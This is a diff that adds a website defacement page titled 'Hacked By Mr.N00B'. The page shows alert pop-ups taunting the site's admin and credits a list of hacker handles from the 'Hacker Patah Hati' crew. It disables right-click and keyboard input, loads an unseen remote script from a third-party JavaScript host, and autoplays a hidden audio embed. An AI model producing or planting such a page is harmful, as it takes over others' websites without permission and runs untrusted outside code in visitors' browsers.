@@ -1,0 +1,166 @@
+<html oncontextmenu='return false;' onkeydown='return false;' onmousedown='return false;' ondragstart='return false' onselectstart='return false' style='-moz-user-select: none; cursor: default;'>
+</head>
+<title>Hacked By Mr.N00B</title>
+<meta property="og:title" content="Hacked By Mr.N00B "/>
+<LINK rel="SHORTCUT ICON" href="https://i.imgur.com/Zqfd3ks.png">
+<meta name="keywords" content="Stay With Me ^_^"/>
+<meta name="description" content="Hacked by Mr.N00B">
+<meta name="author" content=""><meta name="Mr.N00B" content="all,index,follow">
+<meta name="robots" content="index, follow">
+<meta contact=''/><script>alert("Sorry admin im Hacked your system")</script><script>alert("Hacked by Mr.N00B")</script>
+  <script type="text/javascript" src="http://yourjavascript.com/7378381144/mouse.js"></script>
+</head>
+
+<link href='http://fonts.googleapis.com/css?family=' rel=Quattrocento+Sans'stylesheet' type='text/css'>
+	<link href='http://fonts.googleapis.com/css?family=Iceland' rel='stylesheet' type='text/css'>
+              <link href='http://fonts.googleapis.com/css?family=Courier new' rel='stylesheet' type='text/css'>
+
+<script language=JavaScript>
+<!--
+
+//Disable right mouse click Script
+//By Maximus (maximus@nsimail.com) w/ mods by DynamicDrive
+//For full source code, visit http://www.dynamicdrive.com
+
+var message="Hayoo Mau Ngapain? :p";
+
+///////////////////////////////////
+function clickIE4(){
+if (event.button==2){
+alert(message);
+return false;
+}
+}
+
+function clickNS4(e){
+if (document.layers||document.getElementById&&!document.all){
+if (e.which==2||e.which==3){
+alert(message);
+return false;
+}
+}
+}
+
+if (document.layers){
+document.captureEvents(Event.MOUSEDOWN);
+document.onmousedown=clickNS4;
+}
+else if (document.all&&!document.getElementById){
+document.onmousedown=clickIE4;
+}
+
+document.oncontextmenu=new Function("alert(message);return false")
+
+// -->
+</script>
+<script type="text/javascript">
+var snowmax=35
+var snowcolor=new Array("#AAAACC","#DDDDFF","#CCCCDD","#F3F3F3","#F0FFFF")
+var snowtype=new Array("Arial Black","Arial Narrow","Times","Comic Sans MS")
+var snowletter="*"
+var sinkspeed=0.6
+var snowmaxsize=22
+var snowminsize=8
+var snowingzone=1
+
+/* Berandal | OWL SQUAD
+Jangan edit2 dibawah ini Ã°Å¸Ëœâ€˜ */
+var snow=new Array()
+var marginbottom
+var marginright
+var timer
+var i_snow=0
+var x_mv=new Array();
+var crds=new Array();
+var lftrght=new Array();
+var browserinfos=navigator.userAgent 
+var ie5=document.all&&document.getElementById&&!browserinfos.match(/Opera/)
+var ns6=document.getElementById&&!document.all
+var opera=browserinfos.match(/Opera/)  
+var browserok=ie5||ns6||opera
+function randommaker(range) {
+rand=Math.floor(range*Math.random())
+return rand
+}
+function initsnow() {
+if (ie5 || opera) {
+marginbottom = document.body.clientHeight
+marginright = document.body.clientWidth
+}
+else if (ns6) {
+marginbottom = window.innerHeight
+marginright = window.innerWidth
+}
+var snowsizerange=snowmaxsize-snowminsize
+for (i=0;i<=snowmax;i++) {
+crds[i] = 0;                      
+lftrght[i] = Math.random()*15;         
+x_mv[i] = 0.03 + Math.random()/10;
+snow[i]=document.getElementById("s"+i)
+snow[i].style.fontFamily=snowtype[randommaker(snowtype.length)]
+snow[i].size=randommaker(snowsizerange)+snowminsize
+snow[i].style.fontSize=snow[i].size
+snow[i].style.color=snowcolor[randommaker(snowcolor.length)]
+snow[i].sink=sinkspeed*snow[i].size/5
+if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size)}
+if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size)}
+if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4}
+if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2}
+snow[i].posy=randommaker(2*marginbottom-marginbottom-2*snow[i].size)
+snow[i].style.left=snow[i].posx
+snow[i].style.top=snow[i].posy
+}
+movesnow()
+}
+function movesnow() {
+for (i=0;i<=snowmax;i++) {
+crds[i] += x_mv[i];
+snow[i].posy+=snow[i].sink
+snow[i].style.left=snow[i].posx+lftrght[i]*Math.sin(crds[i]);
+snow[i].style.top=snow[i].posy
+if (snow[i].posy>=marginbottom-2*snow[i].size || parseInt(snow[i].style.left)>(marginright-3*lftrght[i])){
+if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size)}
+if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size)}
+if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4}
+if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2}
+snow[i].posy=0
+}
+}
+var timer=setTimeout("movesnow()",50)
+}
+for (i=0;i<=snowmax;i++) {
+document.write("<span id='s"+i+"' style='position:absolute;top:-"+snowmaxsize+"'>"+snowletter+"</span>")
+}
+if (browserok) {
+window.onload=initsnow
+}
+</script>
+
+<table width=100% height=100%><td align=center>
+
+
+<body bgcolor="Black"><center>
+<link href='https://fonts.googleapis.com/css?family=Orbitron' rel='stylesheet' type='text/css'>
+<link rel="SHORTCUT ICON" href="https://s9.postimg.org/i6hcyu8dr/hph.png">
+
+<embed
+src="https://www.youtube.com/v/MNkl2m-0xxY&amp;autoplay=1&amp;loop=1&amp;playlist=UTIpodoaRDo"
+type="application/x-shockwave-flash" wmode="transparent" height="1"
+width="1"></embed>  
+<div class="error">
+
+<center>
+<br>
+<br>
+<img src="https://i.imgur.com/Zqfd3ks.png" width="400"/>
+</br>
+<p>
+<font size="7" face='Orbitron' class="pont" color="white"><font color="red" class="pont2"></font><font color=red>Hacker Patah Hati <br></font>
+<font size="9px" face='Orbitron' class="pont" color="red"><font color="red" class="pont2"></font><font color=white> Hacked By Mr.N00B <br></font>
+<font size="5px" color="#666666" face='Orbitron' class="pont"> 
+<font size="3" color="White" face="Iceland"></font><br>
+<font size="5" color="Grey" face="Orbitron">Sorry Im Hacked Your Website</font><br>
+<b><font size="3" color="White" face="Orbitron"><font color="White"><font color="pink"><marquee behavior="alternate" scrollamount="2" scrolldelay="1" width="30%" height="3%">Stay With Me Min ^_^</marquee><font color="pink"><br>
+<br><font color="Red" face="Orbitron">| <marquee width="40%" behavior="alternate" scrollamount="3"><font color="aqua">|| $tar_$cream | | BDJ-007 | | <font color="red" face="Orbitron"> Mr.N00B <font color="aqua" face="Orbitron">|| Mr.Cr07 | | Mr.xBarakuda | | Yukiteru404 | | LolzSec | | Mr.Swan | | xLon3ly | | Oregon | | S1ZU4IRI-X | | Z-I slow | | Sectivity | | W42001 | | Mr.K4W4! | | RESIS-07 | | dKad0x | | CYBERSCRYTECH | | MRH.404 | | JhonnyTheBay | | Mr.FMR | | iL7C | | Mr.Cur5e | | DIR-64 | | Mr.Wexent | | Albadar | | Mr.Q01y | | TN72 | |ALL MEMBER Hacker Patah Hati| |</font></marquee> |</font><br/><br><br><font size="3" color="Red" face="OWL">  Stay With Me 
+<center>
+</html>
